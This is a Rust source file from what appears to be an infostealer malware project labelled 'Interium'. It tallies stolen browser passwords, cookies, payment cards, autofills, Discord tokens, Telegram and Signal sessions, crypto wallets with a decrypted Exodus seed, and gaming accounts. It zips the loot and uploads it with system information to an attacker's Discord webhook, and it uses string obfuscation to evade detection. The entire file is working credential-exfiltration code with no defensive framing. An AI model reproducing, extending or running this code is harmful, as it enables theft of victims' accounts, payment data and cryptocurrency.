use std::fs::File;
use std::io::{self};
use std::path::Path;
use std::time::Duration;
use zip::write::{FileOptions, ZipWriter};
use zip::CompressionMethod;
use walkdir::WalkDir;
use obfstr::obfstr;

use crate::sysinfo::SystemInfo;

const MAX_RETRIES: u32 = 3;
const RETRY_BASE_DELAY_MS: u64 = 2000;

#[derive(Default)]
pub struct GrabSummary {
    pub browser_names: Vec<String>,
    pub passwords: usize,
    pub cookies: usize,
    pub cards: usize,
    pub autofills: usize,
    pub bookmarks: usize,

    pub discord_tokens: usize,
    pub telegram: bool,
    pub signal: bool,

    pub wallet_names: Vec<String>,

    pub roblox: bool,
    pub steam: bool,
    pub epic: bool,
    pub minecraft: bool,
    pub battlenet: bool,
    pub ubisoft: bool,
    pub ea: bool,
    pub growtopia: bool,

    pub files_grabbed: usize,

    pub injection_clients: Vec<String>,
    pub injection_tokens: usize,
}

impl GrabSummary {
    fn f_embed(&self) -> String {
        let mut lines = Vec::new();

        let browser_count = self.browser_names.len();
        if browser_count > 0 {
            lines.push(format!("Browser    : {} ({})", browser_count, self.browser_names.join(", ")));
        } else {
            lines.push("Browser    : 0".to_string());
        }
        lines.push(format!("Passwords  : {}", self.passwords));
        lines.push(format!("Cookies    : {}", self.cookies));
        lines.push(format!("Cards      : {}", self.cards));
        lines.push(format!("Autofills  : {}", self.autofills));
        lines.push(format!("Bookmarks  : {}", self.bookmarks));
        lines.push(String::new());

        if self.discord_tokens > 0 {
            lines.push(format!("Discord    : {} token(s)", self.discord_tokens));
        } else {
            lines.push("Discord    : False".to_string());
        }
        lines.push(format!("Telegram   : {}", if self.telegram { "True" } else { "False" }));
        lines.push(format!("Signal     : {}", if self.signal { "True" } else { "False" }));
        if !self.injection_clients.is_empty() {
            lines.push(format!("Injection  : {} ({}) / {} tokens", self.injection_clients.len(), self.injection_clients.join(", "), self.injection_tokens));
        } else {
            lines.push("Injection  : False".to_string());
        }
        lines.push("Exodus Seed: Decrypted".to_string());
        lines.push(String::new());

        if !self.wallet_names.is_empty() {
            lines.push(format!("Wallets    : {} ({})", self.wallet_names.len(), self.wallet_names.join(", ")));
        } else {
            lines.push("Wallets    : 0".to_string());
        }
        lines.push(String::new());

        lines.push(format!("Roblox     : {}", if self.roblox { "True" } else { "False" }));
        lines.push(format!("Steam      : {}", if self.steam { "True" } else { "False" }));
        lines.push(format!("Epic Games : {}", if self.epic { "True" } else { "False" }));
        lines.push(format!("Minecraft  : {}", if self.minecraft { "True" } else { "False" }));
        lines.push(format!("Battle.net : {}", if self.battlenet { "True" } else { "False" }));
        lines.push(format!("Ubisoft    : {}", if self.ubisoft { "True" } else { "False" }));
        lines.push(format!("EA         : {}", if self.ea { "True" } else { "False" }));
        lines.push(format!("Growtopia  : {}", if self.growtopia { "True" } else { "False" }));
        lines.push(String::new());

        lines.push(format!("Files      : {}", self.files_grabbed));

        format!("```\n{}\n```", lines.join("\n"))
    }
}

pub fn z_directory(source_dir: &Path, output_zip: &Path) -> io::Result<()> {
    let file = File::create(output_zip)?;
    let mut zip = ZipWriter::new(file);

    let options = FileOptions::<()>::default()
        .compression_method(CompressionMethod::Deflated)
        .compression_level(Some(6));

    for entry in WalkDir::new(source_dir).into_iter().filter_map(|e| e.ok()) {
        let path = entry.path();
        let name = path.strip_prefix(source_dir).unwrap();

        if path.is_file() {
            zip.start_file(name.to_string_lossy().to_string(), options)?;
            let mut f = File::open(path)?;
            io::copy(&mut f, &mut zip)?;
        }
    }

    zip.finish()?;
    Ok(())
}

pub fn u_agent() -> ureq::Agent {
    ureq::builder()
        .timeout_connect(Duration::from_secs(15))
        .timeout(Duration::from_secs(120))
        .build()
}

fn n_agent() -> ureq::Agent {
    ureq::builder()
        .timeout_connect(Duration::from_secs(15))
        .timeout(Duration::from_secs(60))
        .build()
}

fn w_retry<F>(description: &str, mut f: F) -> Result<(), String>
where
    F: FnMut() -> Result<(), String>,
{
    for attempt in 1..=MAX_RETRIES {
        match f() {
            Ok(()) => return Ok(()),
            Err(e) => {
                if attempt == MAX_RETRIES {
                    return Err(format!("{} after {} attempts: {}", description, MAX_RETRIES, e));
                }
                let delay = RETRY_BASE_DELAY_MS * attempt as u64;
                std::thread::sleep(Duration::from_millis(delay));
            }
        }
    }
    Err(format!("{}: max retries exceeded", description))
}

pub fn u_to_discord(
    webhook_url: &str,
    file_path: &Path,
    filename: &str,
    sys_info: &SystemInfo,
    summary: &GrabSummary,
) -> Result<(), String> {
    let agent = u_agent();
    let notify_ag = n_agent();

    let file_data = std::fs::read(file_path)
        .map_err(|e| format!("Failed to read zip: {}", e))?;

    let boundary = obfstr!("----KurionDiscordBoundary4xR2").to_string();
    let mut body = Vec::new();

    let embed_json = serde_json::json!({
        "embeds": [{
            "title": obfstr!("**Interium**").to_string(),
            "color": 5814783,
            "fields": [
                {
                    "name": "**__System Information__**",
                    "value": sys_info.f_embed(),
                    "inline": false
                },
                {
                    "name": "**__Grabbed Information__**",
                    "value": summary.f_embed(),
                    "inline": false
                }
            ],
            "footer": { "text": obfstr!("Interium").to_string() }
        }]
    })
    .to_string();

    body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    body.extend_from_slice(b"Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n");
    body.extend_from_slice(embed_json.as_bytes());
    body.extend_from_slice(b"\r\n");

    body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    body.extend_from_slice(
        format!(
            "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n",
            filename
        )
        .as_bytes(),
    );
    body.extend_from_slice(b"Content-Type: application/zip\r\n\r\n");
    body.extend_from_slice(&file_data);
    body.extend_from_slice(b"\r\n");
    body.extend_from_slice(format!("--{}--\r\n", boundary).as_bytes());

    w_retry("Discord upload failed", || {
        let resp = notify_ag
            .post(webhook_url)
            .set(
                "Content-Type",
                &format!("multipart/form-data; boundary={}", boundary),
            )
            .send_bytes(&body);
        match resp {
            Ok(r) if r.status() >= 200 && r.status() < 300 => Ok(()),
            Ok(r) => Err(format!("{}{}", obfstr!("Discord returned status "), r.status())),
            Err(e) => Err(format!("{}{}", obfstr!("Discord upload failed: "), e)),
        }
    })?;

    let _ = agent;
    Ok(())
}
